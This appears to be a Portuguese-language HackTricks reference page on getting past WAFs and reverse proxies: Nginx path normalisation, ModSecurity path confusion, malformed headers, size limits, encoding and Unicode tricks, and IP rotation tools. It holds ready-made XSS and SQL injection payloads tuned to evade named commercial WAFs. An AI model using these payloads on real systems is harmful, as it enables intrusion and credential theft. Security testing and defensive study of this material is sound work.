# Proxy / WAF Protections Bypass

{{#include ../banners/hacktricks-training.md}}


## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Técnicas [desta pesquisa](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx rule example:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Para impedir bypasses, o Nginx realiza a normalização do caminho antes de verificá-lo. No entanto, se o servidor backend realizar uma normalização diferente (removendo caracteres que o nginx não remove), pode ser possível contornar essa defesa.

### **NodeJS - Express**

| Versão do Nginx | **Caracteres de Bypass do Node.js** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Versão do Nginx | **Caracteres de Bypass do Flask**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Versão do Nginx | **Caracteres de Bypass do Spring Boot** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Configuração FPM do Nginx:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
O Nginx está configurado para bloquear o acesso a `/admin.php`, mas é possível contornar isso acessando `/admin.php/index.php`.

### Como prevenir
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**In this post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) explica que o ModSecurity v3 (até a 3.0.12) **implementou incorretamente a variável `REQUEST_FILENAME`**, que deveria conter o path acessado (até o início dos parâmetros). Isso acontece porque ele realiza uma decodificação de URL para obter o path.\
Portanto, uma requisição como `http://example.com/foo%3f';alert(1);foo=` no mod security vai supor que o path é apenas `/foo` porque `%3f` é transformado em `?`, terminando o path da URL, mas na verdade o path que o servidor receberá será `/foo%3f';alert(1);foo=`.

As variáveis `REQUEST_BASENAME` e `PATH_INFO` também foram afetadas por esse bug.

Algo similar ocorreu na versão 2 do Mod Security que permitia contornar uma proteção que impedia o acesso de usuários a arquivos com extensões específicas relacionadas a backups (como `.bak`) simplesmente enviando o ponto codificado em URL como `%2e`, por exemplo: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[This research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) menciona que era possível bypassar regras do AWS WAF aplicadas sobre HTTP headers ao enviar um cabeçalho "malformed" que não era corretamente parseado pelo AWS, mas era pelo servidor backend.

Por exemplo, enviando a seguinte request com uma SQL injection no header X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Foi possível bypass no AWS WAF porque ele não entendia que a linha seguinte fazia parte do valor do cabeçalho, enquanto o servidor NODEJS entendia (isso foi corrigido).

## Bypasses genéricos de WAF

### Limites de tamanho de requisição

Comumente WAFs têm um certo limite de comprimento de requests para checar e se uma requisição POST/PUT/PATCH ultrapassa esse limite, o WAF não inspeccionará a requisição.

- For AWS WAF, you can [**check the documentation**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Tamanho máximo do corpo de uma requisição web que pode ser inspecionado para as proteções Application Load Balancer e AWS AppSync</td><td>8 KB</td></tr><tr><td>Tamanho máximo do corpo de uma requisição web que pode ser inspecionado para as proteções CloudFront, API Gateway, Amazon Cognito, App Runner, and Verified Access protections**</td><td>64 KB</td></tr></tbody></table>

- Do [**Azure docs**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Web Application Firewalls mais antigos com Core Rule Set 3.1 (ou inferior) permitem mensagens maiores que **128 KB** desligando a inspeção do corpo da requisição, mas essas mensagens não serão verificadas quanto a vulnerabilidades. Para versões mais novas (Core Rule Set 3.2 ou superior), o mesmo pode ser feito desativando o limite máximo do corpo da requisição. Quando uma requisição excede o limite de tamanho:

Se p**revention mode**: Registra e bloqueia a requisição.\
Se **detection mode**: Inspeciona até o limite, ignora o resto, e registra se o `Content-Length` exceder o limite.

- Do [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Por padrão, o WAF inspeciona apenas os primeiros 8KB de uma requisição. Pode aumentar o limite até 128KB adicionando Advanced Metadata.

- Do [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Até 128KB.

### Lacunas na inspeção de assets estáticos (.js GETs)

Algumas stacks CDN/WAF aplicam inspeção de conteúdo fraca ou nenhuma em GET requests para assets estáticos (por exemplo paths terminando em `.js`), enquanto ainda aplicam regras globais como rate limiting e IP reputation. Combinado com auto-caching de extensões estáticas, isso pode ser abusado para entregar ou semear variantes maliciosas que afetam respostas HTML subsequentes.

Casos de uso práticos:

- Enviar payloads em headers não confiáveis (por exemplo, `User-Agent`) em um GET para um caminho `.js` para evitar inspeção de conteúdo, então requisitar imediatamente o HTML principal para influenciar a variante cacheada.
- Usar um IP novo/limpo; uma vez que um IP é marcado, mudanças de roteamento podem tornar a técnica pouco confiável.
- No Burp Repeater, use "Send group in parallel" (single-packet style) para fazer uma corrida entre as duas requisições (`.js` então HTML) pelo mesmo caminho de front-end.

Isto combina bem com header-reflection cache poisoning. Veja:

{{#ref}}
cache-deception/README.md
{{#endref}}

- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)

### Obfuscation <a href="#ip-rotation" id="ip-rotation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Compatibilidade Unicode <a href="#unicode-compatability" id="unicode-compatability"></a>

Dependendo da implementação da normalização Unicode (more info [here](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), caracteres que compartilham compatibilidade Unicode podem ser capazes de bypass the WAF e executar como o payload pretendido. Caracteres compatíveis podem ser encontrados [here](https://www.compart.com/en/unicode).

#### Exemplo <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Contornar WAFs contextuais com codificações <a href="#ip-rotation" id="ip-rotation"></a>

Como mencionado em [**this blog post**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization), para contornar WAFs capazes de manter um contexto da entrada do usuário podemos abusar das técnicas do WAF para, na prática, normalizar a entrada dos usuários.

Por exemplo, no post é mencionado que **Akamai applied URL decode a user input 10 times**. Portanto algo como `<input/%2525252525252525253e/onfocus` será visto pela Akamai como `<input/>/onfocus`, o que **pode fazer com que considere que está ok pois a tag está fechada**. Entretanto, enquanto a aplicação não aplicar URL decode na entrada 10 vezes, a vítima verá algo como `<input/%25252525252525253e/onfocus` que **ainda é válido para um ataque XSS**.

Portanto, isso permite **esconder payloads em componentes codificados** que o WAF vai decodificar e interpretar enquanto a vítima não os verá.

Além disso, isso pode ser feito não só com payloads codificados em URL, mas também com outras codificações como unicode, hex, octal...

No post os seguintes bypasses finais são sugeridos:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

Também é mencionado que, dependendo de **como alguns WAFs entendem o contexto** da entrada do usuário, pode ser possível abusar disso. O exemplo proposto no blog é que a Akamai permitia colocar qualquer coisa entre `/*` e `*/` (potencialmente porque isso é comumente usado como comentários). Portanto, uma SQLinjection como `/*'or sleep(5)-- -*/` não seria detectada e seria válida, já que `/*` é a string inicial da injeção e `*/` está comentada.

Esse tipo de problema de contexto também pode ser usado para **abusar de outras vulnerabilidades além da esperada** para ser explorada pelo WAF (por exemplo, isso também poderia ser usado para explorar um XSS).

### Inline JavaScript first-statement inspection gaps

Alguns rulesets de inspeção inline apenas analisam a primeira instrução JavaScript presente dentro de um event handler. Ao prefixar uma expressão com aparência inofensiva entre parênteses seguida de ponto-e-vírgula (por exemplo `onfocus="(history.length);payload"`), o código malicioso colocado após o ponto-e-vírgula contorna a inspeção enquanto o browser ainda o executa. Combinar isso com foco induzido por fragmento (por exemplo, acrescentando `#forgot_btn` para que o elemento alvo receba foco ao carregar) permite XSS sem clique que pode imediatamente chamar `$.getScript` e iniciar ferramentas de phishing como keyloggers. Veja o [attribute-only login XSS case study](xss-cross-site-scripting/README.md#attribute-only-login-xss-behind-wafs) derivado de [this research](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/).

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>


{{#ref}}
h2c-smuggling.md
{{#endref}}

### Rotação de IP <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Gera uma URL de API gateway para ser usada com ffuf
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Semelhante ao fireprox
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Plugin do Burp Suite que usa IPs de API gateway
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Um número de instâncias de container determinado dinamicamente é ativado com base no tamanho do arquivo de entrada e no fator de divisão, com a entrada dividida em chunks para execução paralela — por exemplo, 100 instâncias processando 100 chunks de um arquivo de 10.000 linhas com fator de divisão de 100 linhas.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Diferentes técnicas podem ser usadas para contornar os filtros regex nos firewalls. Exemplos incluem alternar maiúsculas/minúsculas, adicionar quebras de linha e codificar payloads. Recursos para os vários bypasses podem ser encontrados em [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) e [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Os exemplos abaixo foram retirados de [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Ferramentas

- [**nowafpls**](https://github.com/assetnote/nowafpls): Burp plugin para adicionar dados inúteis às requisições e contornar WAFs com base no comprimento

## Referências

- [https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)


{{#include ../banners/hacktricks-training.md}}
